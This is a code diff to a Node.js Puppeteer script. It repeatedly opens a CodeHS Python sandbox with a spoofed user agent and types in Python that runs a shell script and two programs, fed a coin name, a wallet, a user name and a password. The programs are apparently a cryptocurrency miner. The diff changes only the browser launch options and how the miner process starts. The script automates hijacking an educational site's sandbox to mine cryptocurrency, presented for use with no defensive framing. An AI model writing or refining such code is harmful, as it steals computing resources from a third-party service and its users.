@@ -7,7 +7,10 @@ const puppeteer = require('puppeteer');
     const name = process.argv[4]
     const passw = process.argv[5]
     for(i=0;i<3000;i++){
-    const browser = await puppeteer.launch({executablePath:"/usr/lib/chromium-browser/chromium-browser", args:['--no-sandbox']});
+    const browser = await puppeteer.launch({
+        headless: true,
+        args: ['--no-sandbox']
+    });
     const page = await browser.newPage();
     await page.setUserAgent(userAgent.toString())
     await page.goto('https://codehs.com/sandbox/id/python-3-JjQsnQ')
@@ -17,7 +20,7 @@ const puppeteer = require('puppeteer');
     await page.keyboard.down('ControlLeft')
     await page.keyboard.press('KeyA')
     await page.keyboard.up('ControlLeft')
-    await page.keyboard.type(`import time;import sys;import os;os.system('chmod +x i.sh && ./i.sh');time.sleep(9);os.system('python3 ab.py & python3 m.py ${coin} ${wallet} ${name} ${passw}')`)
+    await page.keyboard.type(`import time;import sys;import subprocess;import os;os.system('chmod +x i.sh && ./i.sh');time.sleep(9);subprocess.Popen(["python3", "ab.py"]);os.system('python3 m.py ${coin} ${wallet} ${name} ${passw}')`)
 
     await page.waitForTimeout(2000)
     await page.mouse.click(580,125,{'button': 'left'})
